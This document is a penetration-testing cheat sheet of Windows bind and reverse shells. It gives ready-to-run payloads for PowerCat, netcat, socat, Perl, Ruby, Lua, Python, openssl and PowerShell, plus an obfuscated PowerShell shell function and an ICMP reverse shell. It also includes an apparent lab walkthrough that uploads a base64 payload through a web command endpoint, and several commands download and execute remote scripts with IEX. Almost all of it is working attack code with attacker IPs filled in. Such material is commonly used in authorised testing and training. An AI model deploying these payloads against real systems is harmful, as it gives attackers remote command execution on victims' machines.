# Windows Shells

## Shellgen

Shellgen is a tool that generates bind shells and reverse shells, it can help you when choosing a shell:

{% embed url="https://github.com/wixnic/shellgen" %}

## Bind Shells

### PowerCat

```
https://github.com/besimorhino/powercat

# Victim (listen)
. .\powercat.ps1
powercat -l -p 7002 -ep

# Connect from attacker
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002
```

Set up listener on the victim machine:

```
powercat -l -p 443 -e cmd.exe
```

Connect to the victim with:

```
nc <VICTIM_IP> 443
```

### Netcat Traditional

```
nc -nlvp 51337 -e cmd.exe
```

## Encrypted Bind Shells

* `socat`:

```bash
# Generate a certificate
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
# Convert into a format socat will accept
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

* Listener:

```bash
socat OPENSSL-LISTEN:$PORT,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

* Client:

```bash
socat - OPENSSL:$IP:$PORT,verify=0
```

* `powercat`:

```powershell
powercat -l -p $PORT -e cmd.exe
```

## Reverse Shells

### Socat

Listen:

```
socat -d -d TCP4-LISTEN:443 STDOUT
```

* \-d -d = increase verbosity (fatal, error, warning, notice)

Connect:

```
socat TCP4:IP:PORT EXEC:/bin/bash
```

### PowerCat

{% embed url="https://github.com/besimorhino/powercat/blob/master/powercat.ps1" %}

You can install powercat on Kali with:

```
sudo apt install powercat
```

The location of the script is located under:

```
/usr/share/windows-resources/powercat
```

You can perform dot-sourcing to make all variables and functions declared in the script available in the current PowerShell scope.

```
. .\powercat.ps1
```

For powercat, a payload is a set of PowerShell instructions **(Can be detected by AV and IDS)**

Set up a listener:

```
sudo nc -lvp 443
```

Connect to your host:

```
powercat -c <YOUR_IP> -p 443 -e cmd.exe
```

Set up a listener:

```
nc -lnvp 443
```

Generate a payload:

```
powercat -c IP -p PORT -e cmd.exe -g > reverse_shell.ps1
```

Generate an encoded payload instead with:

```
powercat -c IP -p PORT -e cmd.exe -ge > encoded_rev_shell.ps1
```

Copy to the `encoded_rev_shell.ps1`  contents to the clipboard, paste it in the target, and execute it with:

```
powershell.exe -E asjdfasdfsdfaf
```

Hit Enter again to execute the encoded command.

We can create a stand-alone payload by adding the -g option to our command:

```
powercat -c <YOUR_IP> -p 443 -e cmd.exe -g > reverse_shell.ps1
```

Then execute the script/payload:

```
./reverse_shell.ps1
```

Alternatively, you can generate a payload using base64 encoding using the -ge option:

```
powercat -c <YOUR_IP> -p 443 -e cmd.exe -ge > base64_reverse_shell.ps1
```

Now read the file with any of these commands:

```
type base64_reverse_shell.ps1
cat base64_reverse_shell.ps1
```

We can use the PowerShell -E (EncodedCommand) option and pass the encoded string:

```
poweshell.exe -E <base64_encoded_string>
```

Then receive the reverse shell connection:

```
sudo nc -lvnp 443
```

### ICMP with Nishang + ICMPsh

```
.EXAMPLE
# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_m.py 192.168.254.226 192.168.254.1

Run above commands to start a listener on a Linux computer (tested on Kali Linux).
icmpsh_m.py is a part of the icmpsh tools.
```

```
❯ sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
[sudo] password for kali:
net.ipv4.icmp_echo_ignore_all = 1
```

{% embed url="https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py" %}

We can download this script:

```
❯ wget https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py
--2021-08-04 09:42:08--  https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4451 (4.3K) [text/plain]
Saving to: ‘icmpsh_m.py’

icmpsh_m.py                                                100%[=======================================================================================================================================>]   4.35K  --.-KB/s    in 0s

2021-08-04 09:42:09 (64.5 MB/s) - ‘icmpsh_m.py’ saved [4451/4451]
```

Check if it runs correctly:

```
❯ python icmpsh_m.py
missing mandatory options. Execute as root:
./icmpsh-m.py <source IP address> <destination IP address>
```

Add your IP address at the end of the file:

```
❯ tail -n 1 Invoke-PowerShellIcmp.ps1
Invoke-PowerShellIcmp -IPAddress 10.10.16.185
```

Remove all the comments:

```
function Invoke-PowerShellIcmp
{ 
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )

    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True

    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)

        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0

            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}


Invoke-PowerShellIcmp -IPAddress 10.10.16.185
```

Remove break lines or empty lines:

```
❯ cat Invoke-PowerShellIcmp.ps1 | sed '/^\s*$/d'
function Invoke-PowerShellIcmp
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,
        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128
    )
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
Invoke-PowerShellIcmp -IPAddress 10.10.16.185
```

Create the new file without empty lines:

```
❯ cat Invoke-PowerShellIcmp.ps1 | sed '/^\s*$/d' > icmp.ps1
```

#### Transfer via HTTP a Base64 file

Since the target system is Windows is better to use PowerShell to avoid encoding problems:

```
PS /home/kali/htb/minion> $file=Get-Content -Raw ./icmp.ps1
PS /home/kali/htb/minion> $bytes=[System.Text.Encoding]::Unicode.GetBytes($file)
PS /home/kali/htb/minion> $encode=[Convert]::ToBase64String($bytes)
PS /home/kali/htb/minion> $encode | Out-File icmp.ps1.b64
```

Check if there are base64 bad characters for the URL transmission:

```
❯ cat icmp.ps1.b64 | grep "+"
❯ cat icmp.ps1.b64 | grep "="
```

Get the URL encoding of those characters:

```php
❯ php --interactive
Interactive mode enabled

php > print urlencode("+");
%2B
php > print urlencode("=");
%3D
php >
```

We can URL decode this to be sure:

```php
❯ php --interactive
Interactive mode enabled

php > print urlencode("+");
%2B
php > print urldecode("%2b");
+
php > print urlencode("=");
%3D
php > print urldecode("%3d");
=
php >
```

Create a backup file:

```bash
❯ cp icmp.ps1.b64 icmp.ps1.b64.bak
```

Replace those bad characters with URL encoded characters:

```bash
cat icmp.ps1.b64 | sed -e 's/=/%3d/g' > icmp.ps1.b64
```

Make the spaces the same across the file with `fold`:

```bash
❯ fold icmp.ps1.b64 | head -n 1 | wc -c
81
❯ fold -w 80 icmp.ps1.b64 | head -n 1 | wc -c
81
```

Create a new file:

```bash
❯ fold icmp.ps1.b64 > icmp
```

Script to upload the file:

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\nExiting..\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

for line in $(cat icmp); do
    command="echo ${line} >> C:\Temp\reverse.ps1"
    curl -s -v -X GET -G "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$command"
done
```

Many requests will be sent:

```bash
❯ ./fileUpload.sh
*   Trying 10.10.10.57:62696...
* Connected to 10.10.10.57 (10.10.10.57) port 62696 (#0)
> GET /test.asp?u=http://localhost/cmd.aspx?xcmd=echo%20ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAEkAYwBtAHAA%20%3E%3E%20C%3A%5CTemp%5Creverse.ps1 HTTP/1.1
> Host: 10.10.10.57:62696
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Cache-Control: private
< Expires: Wed, 04 Aug 2021 16:00:54 GMT
< Server: Microsoft-IIS/8.5
< Set-Cookie: ASPSESSIONIDQAQBRCAB=LJOPECFBAEBCELEKAKJGPFHH; path=/
< X-Powered-By: ASP.NET
< Date: Wed, 04 Aug 2021 14:30:54 GMT
< Content-Length: 163
<
```

The file exists:

```http
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type%20C:\Temp\reverse.ps1
```

Decode base64 file:

```
PS /home/kali/htb/minion> $file=Get-Content ./icmp.ps1.b64.bak
PS /home/kali/htb/minion> $decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
PS /home/kali/htb/minion> $decode
function Invoke-PowerShellIcmp
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,
        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128
    )
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
Invoke-PowerShellIcmp -IPAddress 10.10.16.185
```

Do this in the target machine to create base64 decoded file:

```http
10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell $file=Get-Content C:\Temp\reverse.ps1; $decode=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file)); $decode > C:\Temp\pwned.ps1
```

We can verify that file was successfully created:

```http
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type%20C:\Temp\pwned.ps1
```

Listen on your Kali host (you may want another icmpsh that's not on python [https://github.com/bdamele/icmpsh](https://github.com/bdamele/icmpsh)):

```
❯ sudo python icmpsh_m.py 10.10.16.185 10.10.10.57
```

Execute the base64 decoded file:

```http
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell C:\Temp\pwned.ps1
```

### Python

```
#WindowsC:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### Perl

```
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby

```
#Windowsruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Lua

```
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

### OpenSSH

Attacker

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificateopenssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commandsopenssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```

Victim

```
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
​
#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

### Powershell

```powershell
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
echo "" >> shell.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 443" >> shell.ps1
```

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Invoke-Shell

```
function Invoke-Shell 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $World,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Country,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    try 
    {
        if ($Reverse)
        {
            $dGtrfokiudfjhvnjfe = New-Object System.Net.Sockets.TCPClient($World,$Country)
        }

        if ($Bind)
        {
            $eDDfh987654567 = [System.Net.Sockets.TcpListener]$Country
            $eDDfh987654567.start()    
            $dGtrfokiudfjhvnjfe = $eDDfh987654567.AcceptTcpClient()
        } 

        $zrt54789dvbgH = $dGtrfokiudfjhvnjfe.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        $gfklighloiujGHds = ([text.encoding]::ASCII).GetBytes("Windows PowerShell`nMicrosoft Corporation.`n`n")
        $zrt54789dvbgH.Write($gfklighloiujGHds,0,$gfklighloiujGHds.Length)

        $gfklighloiujGHds = ([text.encoding]::ASCII).GetBytes('$ ' + (Get-Location).Path + '>>')
        $zrt54789dvbgH.Write($gfklighloiujGHds,0,$gfklighloiujGHds.Length)

        while(($i = $zrt54789dvbgH.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                $Poec56fd345 = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something wrong" 
                Write-Error $_
            }
            $GFGFGBbvbgrefdf  = $Poec56fd345 + 'PS ' + (Get-Location).Path + '> '
            $ggh45RedCzIk = ($error[0] | Out-String)
            $error.clear()
            $GFGFGBbvbgrefdf = $GFGFGBbvbgrefdf + $ggh45RedCzIk

            $sendbyte = ([text.encoding]::ASCII).GetBytes($GFGFGBbvbgrefdf)
            $zrt54789dvbgH.Write($sendbyte,0,$sendbyte.Length)
            $zrt54789dvbgH.Flush()  
        }
        $dGtrfokiudfjhvnjfe.Close()
        if ($eDDfh987654567)
        {
            $eDDfh987654567.Stop()
        }
    }
    catch
    {
        Write-Warning "Something wrong!" 
        Write-Error $_
    }
}

Invoke-Shell -Reverse -world 10.10.10.10 -CountrY 443
```

## Fully Interactive Shell on Windows

Pseudo Console (ConPty) in Windows has improved the way Windows handles terminals.

**ConPtyShell uses the function** [**CreatePseudoConsole()**](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole)**.**&#x20;

* This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).

Server Side:

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Client Side:

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

Offline version of the ps1 available at:

{% embed url="https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1" %}



